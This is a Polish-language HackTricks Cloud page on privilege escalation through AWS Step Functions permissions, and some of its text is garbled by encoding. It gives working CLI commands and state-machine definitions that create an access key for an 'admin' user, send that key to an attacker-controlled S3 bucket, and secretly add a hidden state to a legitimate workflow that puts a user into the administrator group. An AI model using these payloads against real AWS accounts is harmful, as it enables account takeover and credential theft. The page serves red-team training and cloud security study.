# AWS - Step Functions Privesc

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}

## Step Functions

Aby uzyska wicej informacji na temat tej usugi AWS, sprawd藕:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### Zasoby zada

Te techniki eskalacji uprawnie bd wymagay u偶ycia niekt贸rych zasob贸w funkcji krok贸w AWS, aby wykona po偶dane dziaania eskalacji uprawnie.

Aby sprawdzi wszystkie mo偶liwe dziaania, mo偶esz przej do swojego konta AWS, wybra dziaanie, kt贸re chcesz u偶y, i zobaczy parametry, kt贸re wykorzystuje, jak w:

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Mo偶esz r贸wnie偶 przej do dokumentacji API AWS i sprawdzi dokumentacj ka偶dego dziaania:

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Atakujcy z uprawnieniami **`states:TestState`** i **`iam:PassRole`** mo偶e testowa dowolny stan i przekazywa dowoln rol IAM do niego bez tworzenia lub aktualizowania istniejcej maszyny stan贸w, co umo偶liwia nieautoryzowany dostp do innych usug AWS z uprawnieniami r贸l. W poczeniu te uprawnienia mog prowadzi do szerokich nieautoryzowanych dziaa, od manipulacji przepywami pracy po modyfikacj danych, naruszenia danych, manipulacj zasobami i eskalacj uprawnie.

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

Poni偶sze przykady pokazuj, jak przetestowa stan, kt贸ry tworzy klucz dostpu dla u偶ytkownika **`admin`**, wykorzystujc te uprawnienia i permissywn rol w rodowisku AWS. Ta permissywna rola powinna mie przypisan jakkolwiek polityk o wysokich uprawnieniach (na przykad **`arn:aws:iam::aws:policy/AdministratorAccess`**), kt贸ra pozwala stanowi na wykonanie akcji **`iam:CreateAccessKey`**:

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **Polecenie** wykonane w celu przeprowadzenia privesc:

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**Potencjalny wpyw**: Nieautoryzowane wykonywanie i manipulacja przepywami pracy oraz dostp do wra偶liwych zasob贸w, co mo偶e prowadzi do powa偶nych narusze bezpieczestwa.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Atakujcy z uprawnieniami **`states:CreateStateMachine`**& **`iam:PassRole`** m贸gby stworzy maszyn stan贸w i przypisa jej dowoln rol IAM, co umo偶liwia nieautoryzowany dostp do innych usug AWS z uprawnieniami tej roli. W przeciwiestwie do poprzedniej techniki eskalacji uprawnie (**`states:TestState`** & **`iam:PassRole`**), ta nie wykonuje si sama, bdziesz r贸wnie偶 potrzebowa uprawnie **`states:StartExecution`** lub **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **nie jest dostpne dla standardowych przepyw贸w pracy**, **tylko dla maszyn stan贸w wyra偶ajcych**) w celu rozpoczcia wykonania maszyny stan贸w.

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

Poni偶sze przykady pokazuj, jak stworzy maszyn stan贸w, kt贸ra tworzy klucz dostpu dla u偶ytkownika **`admin`** i eksfiltruje ten klucz dostpu do kontrolowanego przez atakujcego koszyka S3, wykorzystujc te uprawnienia i liberaln rol w rodowisku AWS. Ta liberalna rola powinna mie przypisan jakkolwiek polityk o wysokich uprawnieniach (na przykad **`arn:aws:iam::aws:policy/AdministratorAccess`**), kt贸ra pozwala maszynie stan贸w na wykonanie akcji **`iam:CreateAccessKey`** i **`s3:putObject`**.

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **Polecenie** wykonane w celu **utworzenia maszyny stan贸w**:

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **Polecenie** wykonane w celu **rozpoczcia wykonania** wczeniej utworzonej maszyny stan贸w:

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
Bucket S3 kontrolowany przez atakujcego powinien mie uprawnienia do akceptowania akcji s3:PutObject z konta ofiary.
{% endhint %}

**Potencjalny wpyw**: Nieautoryzowane wykonywanie i manipulacja przepywami pracy oraz dostp do wra偶liwych zasob贸w, co mo偶e prowadzi do powa偶nych narusze bezpieczestwa.

### `states:UpdateStateMachine` & (nie zawsze wymagane) `iam:PassRole`

Atakujcy z uprawnieniem **`states:UpdateStateMachine`** m贸gby zmodyfikowa definicj maszyny stan贸w, dodajc dodatkowe ukryte stany, kt贸re mogyby prowadzi do eskalacji uprawnie. W ten spos贸b, gdy legalny u偶ytkownik rozpocznie wykonanie maszyny stan贸w, ten nowy zoliwy ukryty stan zostanie wykonany, a eskalacja uprawnie zakoczy si sukcesem.

W zale偶noci od tego, jak permissywna jest rola IAM zwizana z maszyn stan贸w, atakujcy mo偶e napotka 2 sytuacje:

1. **Permisywna rola IAM**: Jeli rola IAM zwizana z maszyn stan贸w jest ju偶 permissywna (ma na przykad doczon polityk **`arn:aws:iam::aws:policy/AdministratorAccess`**), to uprawnienie **`iam:PassRole`** nie byoby wymagane do eskalacji uprawnie, poniewa偶 nie byoby konieczne aktualizowanie roli IAM, wystarczy sama definicja maszyny stan贸w.
2. **Niepermisywna rola IAM**: W przeciwiestwie do poprzedniego przypadku, tutaj atakujcy r贸wnie偶 potrzebowaby uprawnienia **`iam:PassRole`**, poniewa偶 konieczne byoby powizanie permissywnej roli IAM z maszyn stan贸w opr贸cz modyfikacji definicji maszyny stan贸w.

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

Poni偶sze przykady pokazuj, jak zaktualizowa legitn maszyn stan贸w, kt贸ra po prostu wywouje funkcj Lambda HelloWorld, aby doda dodatkowy stan, kt贸ry dodaje u偶ytkownika **`unprivilegedUser`** do grupy IAM **`administrator`**. W ten spos贸b, gdy legitny u偶ytkownik rozpocznie wykonanie zaktualizowanej maszyny stan贸w, ten nowy zoliwy stan ukryty zostanie wykonany, a eskalacja uprawnie zakoczy si sukcesem.

{% hint style="warning" %}
Jeli maszyna stan贸w nie ma przypisanego permissywnego roli IAM, wymagane bdzie r贸wnie偶 uprawnienie **`iam:PassRole`** do zaktualizowania roli IAM w celu przypisania permissywnej roli IAM (na przykad jednej z doczon polityk **`arn:aws:iam::aws:policy/AdministratorAccess`**).
{% endhint %}

{% tabs %}
{% tab title="Legit State Machine" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Zoliwa zaktualizowana maszyna stan贸w" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **Polecenie** wykonane w celu **aktualizacji** **legitnej maszyny stan贸w**:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**Potencjalny wpyw**: Nieautoryzowane wykonywanie i manipulacja przepywami pracy oraz dostp do wra偶liwych zasob贸w, co mo偶e prowadzi do powa偶nych narusze bezpieczestwa.

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
